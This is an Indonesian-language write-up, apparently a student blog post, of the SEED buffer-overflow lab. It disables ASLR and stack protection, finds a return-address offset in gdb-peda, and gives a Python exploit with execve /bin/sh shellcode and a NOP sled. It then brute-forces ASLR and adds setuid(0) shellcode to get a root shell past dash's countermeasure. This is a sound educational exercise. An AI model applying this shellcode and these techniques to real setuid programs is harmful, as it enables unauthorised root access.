<h2 id="0x02-lab">0x02 LAB</h2>
<h3 id="task-1--exploiting-the-vulnerability">TASK 1 : Exploiting the Vulnerability</h3>
<h4 id="1mematikan-address-space-randomization-pada-vm">1.Mematikan Address Space Randomization pada VM.</h4>
<p>Mematikan ASLR dapat kita lakukan dengan command :</p>
<pre><code>sudo sysctl -w kernel.randomize_va_space=0
</code></pre>
<p>Apabila kita tidak mematikan ASLR alamat alamat pada program akan berubah berubah dan kita akan agak kesulitan untuk melakukan buffer overflow</p>
<h4 id="2mengcompile-file-stackc-dengan-mematikan-stackguard-protection-scheme-dan-membuat-shellcode-di-stack-dapat-di-eksekusi-execstack">2.Mengcompile file stack.c dengan mematikan StackGuard Protection Scheme dan membuat shellcode di stack dapat di eksekusi (execstack).</h4>
<p>Secara default compiler gcc saat mengcompile menyalakan StackGuard Protection Scheme untuk mencegah user memasukan input lebih dari yang di definisikan, misal buffer[10] apabila kita memasukan lebih dari 10 character akan terdeteksi stack smasing.</p>
<pre><code>*** stack smashing detected : ./stack terminated
</code></pre>
<p>Selain itu, agar shellcode bisa berjalan perlu -z execstack agar shellcode di stack dapat di eksekusi.</p>
<p>Untuk command nya</p>
<pre><code>gcc -o stack -z execstack -fno-stack-protector stack.c
chmod 4755 stack
</code></pre>
<h4 id="3-mencoba-dan-memastikan-dapat-mengeksekusi-shellcode-dengan-file-call_shellcodec">3. Mencoba dan memastikan dapat mengeksekusi shellcode dengan file call_shellcode.c</h4>
<p>Compile call_shellcode.c dengan menggunakan perintah :</p>
<pre><code>gcc -z execstack -o call_shellcode call_shellcode.c
</code></pre>
<p>Setelah berhasil lalu jalankan program</p>
<pre><code>./call_shellcode
</code></pre>
<p>Hasilnya :</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h4 id="4-mencari-offset-untuk-return-address">4. Mencari offset untuk return address</h4>
<p>Untuk mendebug program dalam linux bisa menggunakan gdb, namun untuk kasus binary exploitation akan lebih disarankan untuk menggunakan gdb-peda, karena mengandung beberapa feature tambahan untuk buffer overflow salah satunya yaitu pattern untuk mencari nilai offset return address.</p>
<p>pada terminal lakukan gdb pada program stack</p>
<pre><code>gdb -q stack
</code></pre>
<p>lalu buat pattern untuk mencari nilai offset return address</p>
<pre><code>pattern create 40
</code></pre>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>setelahnya buat file exploit.py dan masukan pattern ke dalam badfile</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

<span style="color:#75715e"># Fill the content with NOP&#39;s</span>
content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>))
content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">40</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa&#34;</span>

<span style="color:#75715e"># Write the content to badfile</span>
file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;badfile&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
file<span style="color:#f92672">.</span>write(content)
file<span style="color:#f92672">.</span>close()
</code></pre></div><p>lalu jalankan(di terminal baru) dengan command  :</p>
<pre><code>python exploit.py
</code></pre>
<p>akan muncul file bernama badfile, kemudian pada terminal gdb-peda jalankan dengan command run</p>
<p>akan muncul invalid</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>nah kita bisa cari offset return addres nya dengan command pada gdb-peda :</p>
<pre><code>pattern offset 0x61414145
</code></pre>
<p>lalu akan muncul jumlah ofset yang perlu kita ketahui</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<h4 id="5mencari-alamat-buffer">5.Mencari alamat Buffer</h4>
<p>setelah kita tau offset nya, kita perlu mencari tau alamat buffer nya, masuk ke gdb-peda dan lihat code diassambly nya</p>
<pre><code>$ gdb -q stack
gdb-peda$ pdisass main
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Dump of assembler code <span style="color:#66d9ef">for</span> function main:
   <span style="color:#ae81ff">0x080484da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	lea    ecx,[esp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x080484de</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	<span style="color:#f92672">and</span>    esp,<span style="color:#ae81ff">0xfffffff0</span>
   <span style="color:#ae81ff">0x080484e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	push   DWORD PTR [ecx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x080484e4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">10</span><span style="color:#f92672">&gt;</span>:	push   ebp
   <span style="color:#ae81ff">0x080484e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	mov    ebp,esp
   <span style="color:#ae81ff">0x080484e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">13</span><span style="color:#f92672">&gt;</span>:	push   ecx
   <span style="color:#ae81ff">0x080484e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0x214</span>
   <span style="color:#ae81ff">0x080484ee</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">20</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0x8</span>
   <span style="color:#ae81ff">0x080484f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485d0</span>
   <span style="color:#ae81ff">0x080484f6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485d2</span>
   <span style="color:#ae81ff">0x080484fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80483a0</span> <span style="color:#f92672">&lt;</span>fopen<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x08048500</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">38</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08048503</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:	mov    DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>],eax
   <span style="color:#ae81ff">0x08048506</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	push   DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>]
   <span style="color:#ae81ff">0x08048509</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">47</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x205</span>
   <span style="color:#ae81ff">0x0804850e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x1</span>
   <span style="color:#ae81ff">0x08048510</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x211</span>]
   <span style="color:#ae81ff">0x08048516</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:	push   eax
   <span style="color:#ae81ff">0x08048517</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">61</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048360</span> <span style="color:#f92672">&lt;</span>fread<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804851c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">66</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x0804851f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x08048522</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:	lea    eax,[ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x211</span>]
   <span style="color:#ae81ff">0x08048528</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:	push   eax
   <span style="color:#ae81ff">0x08048529</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x80484bb</span> <span style="color:#f92672">&lt;</span>bof<span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804852e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">84</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08048531</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:	sub    esp,<span style="color:#ae81ff">0xc</span>
   <span style="color:#ae81ff">0x08048534</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	push   <span style="color:#ae81ff">0x80485da</span>
   <span style="color:#ae81ff">0x08048539</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">95</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x8048380</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
   <span style="color:#ae81ff">0x0804853e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	add    esp,<span style="color:#ae81ff">0x10</span>
   <span style="color:#ae81ff">0x08048541</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:	mov    eax,<span style="color:#ae81ff">0x1</span>
   <span style="color:#ae81ff">0x08048546</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">108</span><span style="color:#f92672">&gt;</span>:	mov    ecx,DWORD PTR [ebp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x08048549</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span>:	leave  
   <span style="color:#ae81ff">0x0804854a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">112</span><span style="color:#f92672">&gt;</span>:	lea    esp,[ecx<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>]
   <span style="color:#ae81ff">0x0804854d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">115</span><span style="color:#f92672">&gt;</span>:	ret    
End of assembler dump<span style="color:#f92672">.</span>
</code></pre></div><p>kita break saat memamnggil function bof</p>
<pre><code>gdb-peda$ b *main+79
Breakpoint 1 at 0x8048529
gdb-peda$ r
</code></pre>
<p>.*</p>
<p>pada stack terlihat alamat str mulai mengisi nilai
pada alamat tertentu yaitu</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0xbfffea37</span>
</code></pre></div><p><!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>berarti kita dapat menaruh return address mulai dari alamat diatas sampai 517-len(shelccode) dikarenakan kita akan menaruh shelccode pada akhir badfile, jadi ketika kita alihkan ke alamat diantara alamat diatas sampai 517-len(shelccode) kita pada akhirnya akan menemui shellcode dan dapat mengeksekusi nya karena selain shellcode isi badfile hanyalah 0x90(NOP) yg artinya tidak ada  operasi apa-apa.</p>
<p>kita buat saja return address nya</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">0xbfffea77</span>
</code></pre></div><h4 id="6-membuat-payload-dan-mengeksekusi">6. Membuat Payload dan mengeksekusi</h4>
<p>payload =</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys

shellcode<span style="color:#f92672">=</span> (
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># xorl    %eax,%eax              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %eax                   </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;//sh&#34;</span>           <span style="color:#75715e"># pushl   $0x68732f2f            </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x68</span><span style="color:#e6db74">&#34;&#34;/bin&#34;</span>           <span style="color:#75715e"># pushl   $0x6e69622f            </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movl    %esp,%ebx              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %eax                   </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x53</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># pushl   %ebx                   </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movl    %esp,%ecx              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e"># cdq                            </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># movb    $0x0b,%al              </span>
    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>             <span style="color:#75715e"># int     $0x80                  </span>
)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)


offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span>
content <span style="color:#f92672">=</span> bytearray(<span style="color:#ae81ff">0x90</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">517</span>))
start <span style="color:#f92672">=</span> <span style="color:#ae81ff">517</span> <span style="color:#f92672">-</span> len(shellcode)
returna <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x77\xea\xff\xbf</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
content[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;latin-1&#39;</span>)
content[offset:offset<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> returna
content[start:] <span style="color:#f92672">=</span> shellcode
file <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;badfile&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>)
file<span style="color:#f92672">.</span>write(content)
file<span style="color:#f92672">.</span>close()
</code></pre></div><p>pertama-tama seluruh content badfile akan diisi dengan NOP, lalu content pertama kita isi dengan 0x41 untuk mengetahui itu merupakan mulainya str,
kemudian di offset return addres kita isi dengan return address diatas agar masuk ke addres str(badfile), pada akhir ( 517 - len(shellcode)) kita tulis kan shelccode nya</p>
<p>lalu kita buat exploit nya dan menjalankan program stack nya</p>
<pre><code>python3 exploit.py
./StackGuard
</code></pre>
<p>jika berhasil akan mengarahkan kita ke shellcode</p>
<p><!-- raw HTML omitted -->
<!-- raw HTML omitted --></p>
<p>Exploit berhasil kita lakukan</p>
<hr>
<h3 id="task-2-address-randomization">Task 2: Address Randomization</h3>
<p>pada task 2, kita menyalakan sistem aslr dalam linux dengan command</p>
<pre><code>  sudo sysctl -w kernel.randomize_va_space=2
</code></pre>
<p>lalu kita lakukan bruteforce sampai ketemu sesuai dengan alamat address nya,</p>
<pre><code>  sh -c &quot;while [ 1 ]; do ./stack; done;&quot;
</code></pre>
<p>kita lakukan loop sampai program bisa tereksekusi.</p>
<p>Bukti :</p>
<p><img src="/img/task2.png" alt=""></p>
<p>Proses while mencari addres yg sesuai (Faktor Lucky,bisa sangat lama, bisa cepat, tapi kebanyakan lama, saya sendiri beberapa jam baru ketemu) :</p>
<p><img src="/img/prosestask2.png" alt=""></p>
<p>Setelah mendapat shell (akhirnyaaaa) :
<img src="/img/hasiltask2.png" alt=""></p>
<hr>
<h3 id="task-3-stack-guard">Task 3: Stack Guard</h3>
<p>Pada task ini kita mencoba untuk tidak mematikan stack guard protection yang mana akan menghalangi kita untuk melakukan buffer overflow,</p>
<p>Hasil :
<img src="/img/task3.png" alt=""></p>
<hr>
<h3 id="task-4-non-executable-stack">Task 4: Non-executable Stack</h3>
<p>pada task kali ini kita menjalankan program dengan tidak mengijinkan isi stack dapat dieksekusi</p>
<pre><code>  gcc -o stack -z noexecstack -fno-stack-protector stack.c
</code></pre>
<p>perintah noexecstack membuat kita tidak bisa menjalankan shellcode yang ada di dalam Stack</p>
<p>Hasil :</p>
<p><img src="/img/task4.png" alt=""></p>
<p>mendapatkan segmentation fault karena tidak bisa menjalankan payload dalam stack</p>
<hr>
<h3 id="task-5-defeating-dashs-countermeasure">Task 5: Defeating dash&rsquo;s countermeasure</h3>
<p>Kita coba dulu program untuk mendapatkan shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objective-c" data-lang="objective-c"><span style="color:#75715e">// dash_shell_test.c
</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
{
<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[<span style="color:#ae81ff">2</span>];
argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/bin/sh&#34;</span>;
argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> NULL;
<span style="color:#75715e">// setuid(0); ➀
</span><span style="color:#75715e"></span>execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, argv, NULL);
<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>**.</p>
<p>Maka akan mendapat kan root :
<img src="/img/t5.png" alt=""></p>
<p>Tapi ketika kita setuid(0) kita aktifkan maka akan mendapat user seed:
<img src="/img/t51.png" alt=""></p>
<p>Nah kita perlu memodifikasi shellcode agar kita bisa mendapatkan akses root, pada file exploit.py kita tambahkan shellcode berikut pada line diatasnya</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">har shellcode[] <span style="color:#f92672">=</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">1</span>: xorl <span style="color:#f92672">%</span>eax,<span style="color:#f92672">%</span>eax <span style="color:#f92672">*/</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xdb</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">2</span>: xorl <span style="color:#f92672">%</span>ebx,<span style="color:#f92672">%</span>ebx <span style="color:#f92672">*/</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\xd5</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">3</span>: movb <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">0xd5</span>,<span style="color:#f92672">%</span>al <span style="color:#f92672">*/</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">/*</span> Line <span style="color:#ae81ff">4</span>: int <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">0x80</span> <span style="color:#f92672">*/</span>
</code></pre></div><p>akan mendapatkan root :
<img src="/img/t52.png" alt=""></p>
<p>jika program diatas dijalankan pada program yang ada countermeasure dash nya maka kita yang semestinya akan mendapat shell user akan mendapat shell root.</p>
]]></content>
        </item>
        
    </channel>
</rss>
